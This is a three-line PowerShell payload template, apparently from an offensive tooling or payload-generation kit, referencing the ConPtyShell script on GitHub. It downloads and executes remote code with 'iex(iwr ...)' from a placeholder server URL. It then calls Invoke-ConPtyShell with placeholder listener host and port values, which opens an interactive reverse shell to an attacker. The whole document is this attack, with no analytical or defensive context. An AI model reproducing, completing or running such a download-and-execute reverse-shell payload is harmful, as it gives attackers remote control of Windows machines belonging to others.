# https://raw.githubusercontent.com/antoniococo/conptyshell/master/invoke-conptyshell.ps1
iex(iwr -UseBasicParsing §SRVURL§)
Invoke-ConPtyShell §LHOST§ §LPORT§
